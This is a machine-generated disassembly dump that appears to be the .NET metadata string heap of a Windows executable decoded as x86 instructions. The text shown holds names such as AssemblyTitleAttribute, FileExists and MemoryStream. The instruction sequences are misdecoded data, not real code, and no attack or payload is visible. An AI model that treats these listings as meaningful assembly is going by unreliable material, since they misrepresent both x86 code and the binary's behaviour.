  4079ce:	imul   ebp,DWORD PTR [ebp+eiz*2+0x56],0x69737265
  4079d6:	outs   dx,DWORD PTR ds:[esi]
  4079d7:	outs   dx,BYTE PTR ds:[esi]
  4079d8:	inc    ecx
  4079d9:	je     0x407a4f
  4079db:	jb     0x407a46
  4079dd:	bound  esi,QWORD PTR [ebp+0x74]
  4079e0:	add    BYTE PTR gs:[ecx+0x73],al
  4079e4:	jae    0x407a4b
  4079e6:	ins    DWORD PTR es:[edi],dx
  4079e7:	bound  ebp,QWORD PTR [ecx+edi*2+0x49]
  4079eb:	outs   dx,BYTE PTR ds:[esi]
  4079ec:	outs   dx,WORD PTR ds:[esi]
  4079ee:	jb     0x407a5d
  4079f0:	popa   
  4079f1:	je     0x407a5c
  4079f3:	outs   dx,DWORD PTR ds:[esi]
  4079f4:	outs   dx,BYTE PTR ds:[esi]
  4079f5:	popa   
  4079f6:	ins    BYTE PTR es:[edi],dx
  4079f7:	push   esi
  4079f8:	gs jb  0x407a6e
  4079fb:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407a02:	imul   esp,DWORD PTR [edx+0x75],0x53006574
  407a09:	popa   
  407a0a:	je     0x407a71
  407a0c:	ins    BYTE PTR es:[edi],dx
  407a0d:	ins    BYTE PTR es:[edi],dx
  407a0e:	imul   esi,DWORD PTR [ebp+eiz*2+0x43],0x72746e6f
  407a16:	popa   
  407a17:	arpl   WORD PTR [esi+edx*2+0x65],si
  407a1b:	jb     0x407a90
  407a1d:	imul   ebp,DWORD PTR [edi+0x6e],0x72747441
  407a24:	imul   esp,DWORD PTR [edx+0x75],0x4e006574
  407a2b:	gs jne 0x407aa2
  407a2e:	jb     0x407a91
  407a30:	ins    BYTE PTR es:[edi],dx
  407a31:	push   edx
  407a32:	gs jae 0x407aa4
  407a35:	jne    0x407aa9
  407a37:	arpl   WORD PTR [ebp+0x73],sp
  407a3a:	dec    esp
  407a3b:	popa   
  407a3c:	outs   dx,BYTE PTR ds:[esi]
  407a3d:	addr16 jne 0x407aa1
  407a40:	addr16 gs inc ecx
  407a43:	je     0x407ab9
  407a45:	jb     0x407ab0
  407a47:	bound  esi,QWORD PTR [ebp+0x74]
  407a4a:	add    BYTE PTR gs:[ecx+0x73],al
  407a4e:	jae    0x407ab5
  407a50:	ins    DWORD PTR es:[edi],dx
  407a51:	bound  ebp,QWORD PTR [ecx+edi*2+0x44]
  407a55:	gs ins BYTE PTR es:[edi],dx
  407a57:	popa   
  407a58:	jns    0x407aad
  407a5a:	imul   esp,DWORD PTR [edi+0x6e],0x72747441
  407a61:	imul   esp,DWORD PTR [edx+0x75],0x41006574
  407a68:	jae    0x407add
  407a6a:	gs ins DWORD PTR es:[edi],dx
  407a6c:	bound  ebp,QWORD PTR [ecx+edi*2+0x4b]
  407a70:	gs jns 0x407ab9
  407a73:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  407a7b:	bound  esi,QWORD PTR [ebp+0x74]
  407a7e:	add    BYTE PTR gs:[ebx+0x79],dl
  407a82:	jae    0x407af8
  407a84:	gs ins DWORD PTR es:[edi],dx
  407a86:	cs inc esp
  407a88:	imul   esp,DWORD PTR [ecx+0x67],0x74736f6e
  407a8f:	imul   esp,DWORD PTR [ebx+0x73],0x62654400
  407a96:	jne    0x407aff
  407a98:	addr16 popa 
  407a9a:	bound  ebp,QWORD PTR [ebp+eiz*2+0x41]
  407a9e:	je     0x407b14
  407aa0:	jb     0x407b0b
  407aa2:	bound  esi,QWORD PTR [ebp+0x74]
  407aa5:	add    BYTE PTR gs:[ebp+eiz*2+0x62],al
  407aaa:	jne    0x407b13
  407aac:	imul   ebp,DWORD PTR [bp+0x67],0x65646f4d
  407ab4:	jae    0x407ab6
  407ab6:	push   ebx
  407ab7:	jns    0x407b2c
  407ab9:	je     0x407b20
  407abb:	ins    DWORD PTR es:[edi],dx
  407abc:	cs push edx
  407abe:	jne    0x407b2e
  407ac0:	je     0x407b2b
  407ac2:	ins    DWORD PTR es:[edi],dx
  407ac3:	gs cs inc ebx
  407ac6:	outs   dx,DWORD PTR ds:[esi]
  407ac7:	ins    DWORD PTR es:[edi],dx
  407ac8:	jo     0x407b33
  407aca:	ins    BYTE PTR es:[edi],dx
  407acb:	gs jb  0x407b21
  407ace:	gs jb  0x407b47
  407ad1:	imul   esp,DWORD PTR [ebx+0x65],0x6f430073
  407ad8:	ins    DWORD PTR es:[edi],dx
  407ad9:	jo     0x407b44
  407adb:	ins    BYTE PTR es:[edi],dx
  407adc:	popa   
  407add:	je     0x407b48
  407adf:	outs   dx,DWORD PTR ds:[esi]
  407ae0:	outs   dx,BYTE PTR ds:[esi]
  407ae1:	push   edx
  407ae2:	gs ins BYTE PTR es:[edi],dx
  407ae4:	popa   
  407ae5:	js     0x407b48
  407ae7:	je     0x407b52
  407ae9:	outs   dx,DWORD PTR ds:[esi]
  407aea:	outs   dx,BYTE PTR ds:[esi]
  407aeb:	jae    0x407b2e
  407aed:	je     0x407b63
  407aef:	jb     0x407b5a
  407af1:	bound  esi,QWORD PTR [ebp+0x74]
  407af4:	add    BYTE PTR gs:[edx+0x75],dl
  407af8:	outs   dx,BYTE PTR ds:[esi]
  407af9:	je     0x407b64
  407afb:	ins    DWORD PTR es:[edi],dx
  407afc:	gs inc ebx
  407afe:	outs   dx,DWORD PTR ds:[esi]
  407aff:	ins    DWORD PTR es:[edi],dx
  407b00:	jo     0x407b63
  407b02:	je     0x407b6d
  407b04:	bound  ebp,QWORD PTR [ecx+0x6c]
  407b07:	imul   esi,DWORD PTR [ecx+edi*2+0x41],0x69727474
  407b0f:	bound  esi,QWORD PTR [ebp+0x74]
  407b12:	add    BYTE PTR gs:[esi],ch
  407b15:	arpl   WORD PTR [ebx+0x74],sp
  407b18:	outs   dx,DWORD PTR ds:[esi]
  407b19:	jb     0x407b1b
  407b1b:	inc    edi
  407b1c:	gs je  0x407b64
  407b1f:	js     0x407b86
  407b21:	arpl   WORD PTR [ebp+0x74],si
  407b24:	imul   ebp,DWORD PTR [esi+0x67],0x65737341
  407b2b:	ins    DWORD PTR es:[edi],dx
  407b2c:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407b30:	inc    ecx
  407b31:	je     0x407ba7
  407b33:	jb     0x407b9e
  407b35:	bound  esi,QWORD PTR [ebp+0x74]
  407b38:	gs push ebp
  407b3a:	jae    0x407b9d
  407b3c:	addr16 gs inc ecx
  407b3f:	je     0x407bb5
  407b41:	jb     0x407bac
  407b43:	bound  esi,QWORD PTR [ebp+0x74]
  407b46:	add    BYTE PTR gs:[ecx+0x74],al
  407b4a:	je     0x407bbe
  407b4c:	imul   esp,DWORD PTR [edx+0x75],0x61546574
  407b53:	jb     0x407bbc
  407b55:	gs je  0x407bcb
  407b58:	add    BYTE PTR [ebx+0x65],dh
  407b5b:	je     0x407bbc
  407b5d:	inc    esp
  407b5e:	gs jae 0x407bc4
  407b61:	jb     0x407bcc
  407b63:	jo     0x407bd9
  407b65:	imul   ebp,DWORD PTR [edi+0x6e],0x756c6156
  407b6c:	add    BYTE PTR gs:[ecx+edi*2+0x70],dl
  407b71:	add    BYTE PTR gs:[edi+0x65],al
  407b75:	je     0x407bcb
  407b77:	jns    0x407be9
  407b79:	add    BYTE PTR gs:[edi+0x65],ah
  407b7d:	je     0x407bde
  407b7f:	inc    ecx
  407b80:	jae    0x407bf5
  407b82:	gs ins DWORD PTR es:[edi],dx
  407b84:	bound  ebp,QWORD PTR [ecx+edi*2+0x0]
  407b88:	push   ebx
  407b89:	jns    0x407bfe
  407b8b:	je     0x407bf2
  407b8d:	ins    DWORD PTR es:[edi],dx
  407b8e:	cs push esp
  407b90:	push   0x64616572
  407b95:	imul   ebp,DWORD PTR [esi+0x67],0x746e4900
  407b9c:	gs jb  0x407c0b
  407b9f:	outs   dx,DWORD PTR ds:[esi]
  407ba0:	arpl   WORD PTR [ebx+0x65],bp
  407ba3:	add    BYTE PTR fs:[ebx+0x6f],al
  407ba7:	ins    DWORD PTR es:[edi],dx
  407ba8:	jo     0x407c0b
  407baa:	jb     0x407c11
  407bac:	inc    ebp
  407bad:	js     0x407c12
  407baf:	push   0x65676e61
  407bb4:	add    BYTE PTR [ebx+0x74],dl
  407bb7:	jb     0x407c22
  407bb9:	outs   dx,BYTE PTR ds:[esi]
  407bba:	add    BYTE PTR [bx+0x65],ah
  407bbe:	je     0x407c1f
  407bc0:	dec    esp
  407bc1:	outs   dx,BYTE PTR gs:[esi]
  407bc3:	addr16 je 0x407c2e
  407bc6:	add    BYTE PTR [ebx+0x75],dl
  407bc9:	bound  esi,QWORD PTR [ebx+0x74]
  407bcc:	jb     0x407c37
  407bce:	outs   dx,BYTE PTR ds:[esi]
  407bcf:	add    BYTE PTR [bp+di+0x6f],al
  407bd3:	outs   dx,BYTE PTR ds:[esi]
  407bd4:	arpl   WORD PTR [ecx+0x74],sp
  407bd7:	add    BYTE PTR [edi+0x65],ah
  407bda:	je     0x407c3b
  407bdc:	inc    ebx
  407bdd:	jne    0x407c51
  407bdf:	jb     0x407c46
  407be1:	outs   dx,BYTE PTR ds:[esi]
  407be2:	je     0x407c27
  407be4:	jne    0x407c52
  407be6:	je     0x407c5d
  407be8:	jb     0x407c4f
  407bea:	add    BYTE PTR [ecx+0x46],cl
  407bed:	outs   dx,DWORD PTR ds:[esi]
  407bee:	jb     0x407c5d
  407bf0:	popa   
  407bf1:	je     0x407c43
  407bf3:	jb     0x407c64
  407bf5:	jbe    0x407c60
  407bf7:	fs gs jb 0x407bfb
  407bfb:	inc    ebx
  407bfc:	outs   dx,DWORD PTR ds:[esi]
  407bfd:	outs   dx,BYTE PTR ds:[esi]
  407bfe:	je     0x407c61
  407c00:	imul   ebp,DWORD PTR [esi+0x73],0x79654b
  407c07:	inc    ecx
  407c08:	fs add BYTE PTR fs:[ebx+0x6f],al
  407c0d:	outs   dx,BYTE PTR ds:[esi]
  407c0e:	jae    0x407c7f
  407c10:	ins    BYTE PTR es:[edi],dx
  407c11:	add    BYTE PTR gs:[ebp+eiz*2+0x78],dl
  407c16:	je     0x407c6f
  407c18:	jb     0x407c83
  407c1a:	je     0x407c81
  407c1c:	jb     0x407c1e
  407c1e:	addr16 gs je 0x407c81
  407c22:	inc    ebp
  407c23:	jb     0x407c97
  407c25:	outs   dx,DWORD PTR ds:[esi]
  407c26:	jb     0x407c28
  407c28:	dec    ecx
  407c29:	outs   dx,BYTE PTR ds:[esi]
  407c2a:	je     0x407c5f
  407c2c:	xor    al,BYTE PTR [eax]
  407c2e:	push   edi
  407c2f:	jb     0x407c9a
  407c31:	je     0x407c98
  407c33:	dec    esp
  407c34:	imul   ebp,DWORD PTR [esi+0x65],0x74615000
  407c3b:	push   0x74654700
  407c40:	inc    ebp
  407c41:	js     0x407cb7
  407c43:	outs   dx,BYTE PTR gs:[esi]
  407c45:	jae    0x407cb0
  407c47:	outs   dx,DWORD PTR ds:[esi]
  407c48:	outs   dx,BYTE PTR ds:[esi]
  407c49:	add    BYTE PTR [edi+0x65],ah
  407c4c:	je     0x407cad
  407c4e:	dec    ecx
  407c4f:	outs   dx,BYTE PTR ds:[esi]
  407c50:	jbe    0x407cb3
  407c52:	jb     0x407cbd
  407c54:	popa   
  407c55:	outs   dx,BYTE PTR ds:[esi]
  407c56:	je     0x407c9b
  407c58:	jne    0x407cc6
  407c5a:	je     0x407cd1
  407c5c:	jb     0x407cc3
  407c5e:	add    BYTE PTR [ebx+0x6f],al
  407c61:	ins    DWORD PTR es:[edi],dx
  407c62:	jo     0x407cc5
  407c64:	jb     0x407ccb
  407c66:	add    BYTE PTR [ebp+0x6e],al
  407c69:	jbe    0x407cd4
  407c6b:	jb     0x407cdc
  407c6d:	outs   dx,BYTE PTR ds:[esi]
  407c6e:	ins    DWORD PTR es:[edi],dx
  407c6f:	outs   dx,BYTE PTR gs:[esi]
  407c71:	je     0x407c73
  407c73:	inc    ebp
  407c74:	js     0x407cdf
  407c76:	je     0x407c78
  407c78:	jae    0x407cdf
  407c7a:	je     0x407cdb
  407c7c:	inc    ebp
  407c7d:	js     0x407ce8
  407c7f:	je     0x407cc4
  407c81:	outs   dx,DWORD PTR ds:[esi]
  407c82:	fs add BYTE PTR gs:[ebp+0x71],al
  407c87:	jne    0x407cea
  407c89:	ins    BYTE PTR es:[edi],dx
  407c8a:	jae    0x407c8c
  407c8c:	dec    ecx
  407c8d:	outs   dx,BYTE PTR ds:[esi]
  407c8e:	fs gs js 0x407ce1
  407c92:	data16 add BYTE PTR [edi+0x65],ah
  407c96:	je     0x407cf7
  407c98:	inc    ebx
  407c99:	push   0x737261
  407c9e:	push   ebx
  407c9f:	je     0x407d02
  407ca1:	jb     0x407d17
  407ca3:	jae    0x407cfc
  407ca5:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x41746547
  407cad:	jae    0x407d22
  407caf:	gs ins DWORD PTR es:[edi],dx
  407cb1:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  407cb5:	popa   
  407cb6:	ins    DWORD PTR es:[edi],dx
  407cb7:	add    BYTE PTR gs:[ebp+0x65],cl
  407cbb:	ins    DWORD PTR es:[edi],dx
  407cbc:	bound  esp,QWORD PTR [ebp+0x72]
  407cbf:	dec    ecx
  407cc0:	outs   dx,BYTE PTR ds:[esi]
  407cc1:	outs   dx,WORD PTR ds:[esi]
  407cc3:	add    BYTE PTR [edi+0x65],ah
  407cc6:	je     0x407d27
  407cc8:	dec    esi
  407cc9:	popa   
  407cca:	ins    DWORD PTR es:[edi],dx
  407ccb:	add    BYTE PTR gs:[edi+0x65],ah
  407ccf:	je     0x407d30
  407cd1:	dec    ebp
  407cd2:	gs jae 0x407d48
  407cd5:	popa   
  407cd6:	add    BYTE PTR gs:[si+0x6f],dl
  407cdb:	dec    esp
  407cdc:	outs   dx,DWORD PTR ds:[esi]
  407cdd:	ja     0x407d44
  407cdf:	jb     0x407ce1
  407ce1:	inc    esi
  407ce2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x73697845
  407cea:	je     0x407d5f
  407cec:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  407cf0:	gs je  0x407d58
  407cf3:	add    BYTE PTR [ecx+eiz*2+0x73],cl
  407cf7:	je     0x407d42
  407cf9:	outs   dx,BYTE PTR ds:[esi]
  407cfa:	fs gs js 0x407d4d
  407cfe:	data16 add BYTE PTR [ebx+0x6f],al
  407d02:	ins    DWORD PTR es:[edi],dx
  407d03:	jo     0x407d66
  407d05:	jb     0x407d6c
  407d07:	dec    ecx
  407d08:	outs   dx,BYTE PTR ds:[esi]
  407d09:	outs   dx,WORD PTR ds:[esi]
  407d0b:	add    BYTE PTR [edi+0x65],ah
  407d0e:	je     0x407d6f
  407d10:	inc    ebx
  407d11:	outs   dx,DWORD PTR ds:[esi]
  407d12:	ins    DWORD PTR es:[edi],dx
  407d13:	jo     0x407d76
  407d15:	jb     0x407d7c
  407d17:	dec    ecx
  407d18:	outs   dx,BYTE PTR ds:[esi]
  407d19:	outs   dx,WORD PTR ds:[esi]
  407d1b:	add    BYTE PTR [ebx+0x6f],al
  407d1e:	ins    DWORD PTR es:[edi],dx
  407d1f:	jo     0x407d82
  407d21:	jb     0x407d88
  407d23:	dec    edi
  407d24:	jo     0x407d9a
  407d26:	imul   ebp,DWORD PTR [edi+0x6e],0x73490073
  407d2d:	push   ebx
  407d2e:	jne    0x407d96
  407d30:	imul   di,WORD PTR [eax+0x0],0x6c43
  407d36:	gs popa 
  407d38:	jb     0x407d3a
  407d3a:	addr16 gs je 0x407d9d
  407d3e:	inc    ebx
  407d3f:	outs   dx,DWORD PTR ds:[esi]
  407d40:	jne    0x407db0
  407d42:	je     0x407d44
  407d44:	inc    ecx
  407d45:	jo     0x407db7
  407d47:	inc    esp
  407d48:	outs   dx,DWORD PTR ds:[esi]
  407d49:	ins    DWORD PTR es:[edi],dx
  407d4a:	popa   
  407d4b:	imul   ebp,DWORD PTR [esi+0x0],0x5f746567
  407d52:	inc    ebx
  407d53:	jne    0x407dc7
  407d55:	jb     0x407dbc
  407d57:	outs   dx,BYTE PTR ds:[esi]
  407d58:	je     0x407d9e
  407d5a:	outs   dx,DWORD PTR ds:[esi]
  407d5b:	ins    DWORD PTR es:[edi],dx
  407d5c:	popa   
  407d5d:	imul   ebp,DWORD PTR [esi+0x0],0x6f736552
  407d64:	ins    BYTE PTR es:[edi],dx
  407d65:	jbe    0x407dcc
  407d67:	inc    ebp
  407d68:	jbe    0x407dcf
  407d6a:	outs   dx,BYTE PTR ds:[esi]
  407d6b:	je     0x407db5
  407d6d:	popa   
  407d6e:	outs   dx,BYTE PTR ds:[esi]
  407d6f:	fs ins BYTE PTR es:[edi],dx
  407d71:	gs jb  0x407d74
  407d74:	popa   
  407d75:	fs fs pop edi
  407d78:	inc    ecx
  407d79:	jae    0x407dee
  407d7b:	gs ins DWORD PTR es:[edi],dx
  407d7d:	bound  ebp,QWORD PTR [ecx+edi*2+0x52]
  407d81:	gs jae 0x407df3
  407d84:	ins    BYTE PTR es:[edi],dx
  407d85:	jbe    0x407dec
  407d87:	add    BYTE PTR [edi+0x65],ah
  407d8a:	je     0x407deb
  407d8c:	dec    ecx
  407d8d:	outs   dx,BYTE PTR ds:[esi]
  407d8e:	outs   dx,BYTE PTR ds:[esi]
  407d8f:	gs jb  0x407dd7
  407d92:	js     0x407df7
  407d94:	gs jo  0x407e0b
  407d97:	imul   ebp,DWORD PTR [edi+0x6e],0x73795300
  407d9e:	je     0x407e05
  407da0:	ins    DWORD PTR es:[edi],dx
  407da1:	cs pop eax
  407da3:	ins    DWORD PTR es:[edi],dx
  407da4:	ins    BYTE PTR es:[edi],dx
  407da5:	add    BYTE PTR [eax+0x6d],bl
  407da8:	ins    BYTE PTR es:[edi],dx
  407da9:	inc    ebp
  407daa:	js     0x407e0f
  407dac:	gs jo  0x407e23
  407daf:	imul   ebp,DWORD PTR [edi+0x6e],0x72745300
  407db6:	imul   ebp,DWORD PTR [esi+0x67],0x6c697542
  407dbd:	fs gs jb 0x407dc1
  407dc1:	inc    ecx
  407dc2:	jo     0x407e34
  407dc4:	outs   dx,BYTE PTR gs:[esi]
  407dc6:	add    BYTE PTR fs:[edi+ebp*2+0x53],dl
  407dcb:	je     0x407e3f
  407dcd:	imul   ebp,DWORD PTR [esi+0x67],0x67724100
  407dd4:	jne    0x407e43
  407dd6:	outs   dx,BYTE PTR gs:[esi]
  407dd8:	je     0x407e1f
  407dda:	js     0x407e3f
  407ddc:	gs jo  0x407e53
  407ddf:	imul   ebp,DWORD PTR [edi+0x6e],0x454f4900
  407de6:	js     0x407e4b
  407de8:	gs jo  0x407e5f
  407deb:	imul   ebp,DWORD PTR [edi+0x6e],0x756e4500
  407df2:	ins    DWORD PTR es:[edi],dx
  407df3:	gs jb  0x407e57
  407df6:	je     0x407e67
  407df8:	jb     0x407dfa
  407dfa:	inc    edi
  407dfb:	gs je  0x407e43
  407dfe:	outs   dx,BYTE PTR ds:[esi]
  407dff:	jne    0x407e6e
  407e01:	gs jb  0x407e65
  407e04:	je     0x407e75
  407e06:	jb     0x407e08
  407e08:	addr16 gs je 0x407e6b
  407e0c:	inc    ebx
  407e0d:	jne    0x407e81
  407e0f:	jb     0x407e76
  407e11:	outs   dx,BYTE PTR ds:[esi]
  407e12:	je     0x407e14
  407e14:	addr16 gs je 0x407e77
  407e18:	inc    esi
  407e19:	jne    0x407e87
  407e1b:	ins    BYTE PTR es:[edi],dx
  407e1c:	dec    esi
  407e1d:	popa   
  407e1e:	ins    DWORD PTR es:[edi],dx
  407e1f:	add    BYTE PTR gs:[ebx+0x74],dl
  407e23:	jb     0x407e8e
  407e25:	outs   dx,BYTE PTR ds:[esi]
  407e26:	addr16 inc ebx
  407e28:	outs   dx,DWORD PTR ds:[esi]
  407e29:	ins    DWORD PTR es:[edi],dx
  407e2a:	jo     0x407e8d
  407e2c:	jb     0x407e97
  407e2e:	jae    0x407e9f
  407e30:	outs   dx,BYTE PTR ds:[esi]
  407e31:	add    BYTE PTR [edi+0x65],ah
  407e34:	je     0x407e95
  407e36:	inc    ebx
  407e37:	outs   dx,DWORD PTR ds:[esi]
  407e38:	fs gs inc edx
  407e3b:	popa   
  407e3c:	jae    0x407ea3
  407e3e:	add    BYTE PTR [edi+ebp*2+0x61],cl
  407e42:	fs inc esi
  407e44:	jb     0x407eb5
  407e46:	ins    DWORD PTR es:[edi],dx
  407e47:	add    BYTE PTR [ebp+0x6f],cl
  407e4a:	jbe    0x407eb1
  407e4c:	dec    esi
  407e4d:	gs js  0x407ec4
  407e50:	add    BYTE PTR [ecx+0x44],cl
  407e53:	imul   esi,DWORD PTR [ebx+0x70],0x6261736f
  407e5a:	ins    BYTE PTR es:[edi],dx
  407e5b:	add    BYTE PTR gs:[ecx+ebp*2+0x73],al
  407e60:	jo     0x407ed1
  407e62:	jae    0x407ec9
  407e64:	add    BYTE PTR [ebx+0x79],dl
  407e67:	jae    0x407edd
  407e69:	gs ins DWORD PTR es:[edi],dx
  407e6b:	cs inc ebx
  407e6d:	outs   dx,DWORD PTR ds:[esi]
  407e6e:	fs gs inc esp
  407e71:	outs   dx,DWORD PTR ds:[esi]
  407e72:	ins    DWORD PTR es:[edi],dx
  407e73:	cs inc ebx
  407e75:	outs   dx,DWORD PTR ds:[esi]
  407e76:	ins    DWORD PTR es:[edi],dx
  407e77:	jo     0x407ee2
  407e79:	ins    BYTE PTR es:[edi],dx
  407e7a:	gs jb  0x407e7d
  407e7d:	inc    ebx
  407e7e:	outs   dx,DWORD PTR ds:[esi]
  407e7f:	fs gs inc esp
  407e82:	outs   dx,DWORD PTR ds:[esi]
  407e83:	ins    DWORD PTR es:[edi],dx
  407e84:	push   eax
  407e85:	jb     0x407ef6
  407e87:	jbe    0x407ef2
  407e89:	fs gs jb 0x407e8d
  407e8d:	inc    ebx
  407e8e:	jb     0x407ef5
  407e90:	popa   
  407e91:	je     0x407ef8
  407e93:	push   eax
  407e94:	jb     0x407f05
  407e96:	jbe    0x407f01
  407e98:	fs gs jb 0x407e9c
  407e9c:	inc    ebx
  407e9d:	push   0x56007261
  407ea2:	outs   dx,DWORD PTR ds:[esi]
  407ea3:	ins    BYTE PTR es:[edi],dx
  407ea4:	jne    0x407f13
  407ea6:	gs push ebx
  407ea8:	gs jo  0x407f0c
  407eab:	jb     0x407f0e
  407ead:	je     0x407f1e
  407eaf:	jb     0x407ef4
  407eb1:	push   0x44007261
  407eb6:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  407ebd:	jns    0x407f12
  407ebf:	gs jo  0x407f23
  407ec2:	jb     0x407f25
  407ec4:	je     0x407f35
  407ec6:	jb     0x407f0b
  407ec8:	push   0x41007261
  407ecd:	ins    BYTE PTR es:[edi],dx
  407ece:	je     0x407f14
  407ed0:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  407ed7:	jns    0x407f2c
  407ed9:	gs jo  0x407f3d
  407edc:	jb     0x407f3f
  407ede:	je     0x407f4f
  407ee0:	jb     0x407f25
  407ee2:	push   0x4c007261
  407ee7:	popa   
  407ee8:	jae    0x407f5e
  407eea:	dec    ecx
  407eeb:	outs   dx,BYTE PTR ds:[esi]
  407eec:	fs gs js 0x407f3f
  407ef0:	inc    cx
  407ef2:	outs   dx,BYTE PTR ds:[esi]
  407ef3:	jns    0x407ef5
  407ef5:	addr16 gs je 0x407f58
  407ef9:	inc    esi
  407efa:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  407f02:	jae    0x407f6d
  407f04:	outs   dx,DWORD PTR ds:[esi]
  407f05:	outs   dx,BYTE PTR ds:[esi]
  407f06:	add    BYTE PTR [ebx+0x79],dl
  407f09:	jae    0x407f7f
  407f0b:	gs ins DWORD PTR es:[edi],dx
  407f0d:	cs inc esp
  407f0f:	gs jae 0x407f7b
  407f12:	outs   dx,BYTE PTR ds:[si]
  407f14:	add    BYTE PTR [ebx+0x79],dl
  407f17:	jae    0x407f8d
  407f19:	gs ins DWORD PTR es:[edi],dx
  407f1b:	cs push edx
  407f1d:	gs jae 0x407f8f
  407f20:	jne    0x407f94
  407f22:	arpl   WORD PTR [ebp+0x73],sp
  407f25:	cs push esp
  407f27:	outs   dx,DWORD PTR ds:[esi]
  407f28:	outs   dx,DWORD PTR ds:[esi]
  407f29:	ins    BYTE PTR es:[edi],dx
  407f2a:	jae    0x407f2c
  407f2c:	push   ebx
  407f2d:	je     0x407fa1
  407f2f:	outs   dx,DWORD PTR ds:[esi]
  407f30:	outs   dx,BYTE PTR ds:[esi]
  407f31:	ins    BYTE PTR es:[di],dx
  407f33:	jns    0x407f89
  407f35:	jns    0x407fa7
  407f37:	gs fs push edx
  407f3a:	gs jae 0x407fac
  407f3d:	jne    0x407fb1
  407f3f:	arpl   WORD PTR [ebp+0x42],sp
  407f42:	jne    0x407fad
  407f44:	ins    BYTE PTR es:[edi],dx
  407f45:	fs gs jb 0x407f49
  407f49:	push   esi
  407f4a:	gs jb  0x407fb6
  407f4d:	data16 jns 0x407fa2
  407f50:	gs jae 0x407fc2
  407f53:	jne    0x407fc7
  407f55:	arpl   WORD PTR [ebp+0x4e],sp
  407f58:	popa   
  407f59:	ins    DWORD PTR es:[edi],dx
  407f5a:	add    BYTE PTR gs:[ecx+0x73],cl
  407f5e:	dec    esi
  407f5f:	jne    0x407fcd
  407f61:	ins    BYTE PTR es:[edi],dx
  407f62:	dec    edi
  407f63:	jb     0x407faa
  407f65:	ins    DWORD PTR es:[edi],dx
  407f66:	jo     0x407fdc
  407f68:	jns    0x407f6a
  407f6a:	push   edi
  407f6b:	jb     0x407fd6
  407f6d:	je     0x407fd4
  407f6f:	add    BYTE PTR [ebp+0x6e],al
  407f72:	fs jae 0x407fcc
  407f75:	imul   esi,DWORD PTR [eax+ebp*2+0x0],0x74737953
  407f7d:	gs ins DWORD PTR es:[edi],dx
  407f7f:	cs inc ebx
  407f81:	outs   dx,DWORD PTR ds:[esi]
  407f82:	fs gs inc esp
  407f85:	outs   dx,DWORD PTR ds:[esi]
  407f86:	ins    DWORD PTR es:[edi],dx
  407f87:	add    BYTE PTR [ebx+0x6f],al
  407f8a:	fs gs inc ebx
  407f8d:	outs   dx,DWORD PTR ds:[esi]
  407f8e:	ins    DWORD PTR es:[edi],dx
  407f8f:	jo     0x407ffa
  407f91:	ins    BYTE PTR es:[edi],dx
  407f92:	gs push ebp
  407f94:	outs   dx,BYTE PTR ds:[esi]
  407f95:	imul   esi,DWORD PTR [eax+eax*1+0x49],0x74636944
  407f9d:	imul   ebp,DWORD PTR [edi+0x6e],0x797261
  407fa4:	inc    ebx
  407fa5:	jb     0x40800c
  407fa7:	popa   
  407fa8:	je     0x40800f
  407faa:	add    BYTE PTR [ebx+0x79],dl
  407fad:	jae    0x408023
  407faf:	gs ins DWORD PTR es:[edi],dx
  407fb1:	cs inc ebx
  407fb3:	outs   dx,DWORD PTR ds:[esi]
  407fb4:	ins    BYTE PTR es:[edi],dx
  407fb5:	ins    BYTE PTR es:[edi],dx
  407fb6:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407fbb:	outs   dx,BYTE PTR ds:[esi]
  407fbc:	jae    0x407fec
  407fbe:	push   ebx
  407fbf:	jo     0x408026
  407fc1:	arpl   WORD PTR [ecx+0x61],bp
  407fc4:	ins    BYTE PTR es:[edi],dx
  407fc5:	imul   edi,DWORD PTR [edx+0x65],0x74530064
  407fcc:	jb     0x408037
  407fce:	outs   dx,BYTE PTR ds:[esi]
  407fcf:	addr16 inc ebx
  407fd1:	outs   dx,DWORD PTR ds:[esi]
  407fd2:	ins    BYTE PTR es:[edi],dx
  407fd3:	ins    BYTE PTR es:[edi],dx
  407fd4:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  407fd9:	outs   dx,BYTE PTR ds:[esi]
  407fda:	add    BYTE PTR [edi+0x65],ah
  407fdd:	je     0x40803e
  407fdf:	push   edx
  407fe0:	gs data16 gs jb 0x40804a
  407fe5:	outs   dx,BYTE PTR ds:[esi]
  407fe6:	arpl   WORD PTR [ebp+0x64],sp
  407fe9:	inc    ecx
  407fea:	jae    0x40805f
  407fec:	gs ins DWORD PTR es:[edi],dx
  407fee:	bound  ebp,QWORD PTR [ecx+ebp*2+0x65]
  407ff2:	jae    0x407ff4
  407ff4:	inc    ebx
  407ff5:	outs   dx,DWORD PTR ds:[esi]
  407ff6:	fs gs inc edi
  407ff9:	outs   dx,BYTE PTR gs:[esi]
  407ffb:	gs jb  0x40805f
  407ffe:	je     0x40806f
  408000:	jb     0x408051
  408002:	jo     0x408078
  408004:	imul   ebp,DWORD PTR [edi+0x6e],0x54550073
  40800b:	inc    esi
  40800c:	cmp    BYTE PTR [ebp+0x6e],al
  40800f:	arpl   WORD PTR [edi+0x64],bp
  408012:	imul   ebp,DWORD PTR [esi+0x67],0x72745300
  408019:	gs popa 
  40801b:	ins    DWORD PTR es:[edi],dx
  40801c:	push   edi
  40801d:	jb     0x408088
  40801f:	je     0x408086
  408021:	jb     0x408023
  408023:	inc    edi
  408024:	outs   dx,BYTE PTR gs:[esi]
  408026:	gs jb  0x40808a
  408029:	je     0x408090
  40802b:	inc    ebx
  40802c:	outs   dx,DWORD PTR ds:[esi]
  40802d:	fs gs inc esi
  408030:	jb     0x4080a1
  408032:	ins    DWORD PTR es:[edi],dx
  408033:	inc    ebx
  408034:	outs   dx,DWORD PTR ds:[esi]
  408035:	ins    DWORD PTR es:[edi],dx
  408036:	jo     0x4080a1
  408038:	ins    BYTE PTR es:[edi],dx
  408039:	gs push ebp
  40803b:	outs   dx,BYTE PTR ds:[esi]
  40803c:	imul   esi,DWORD PTR [eax+eax*1+0x54],0x7272416f
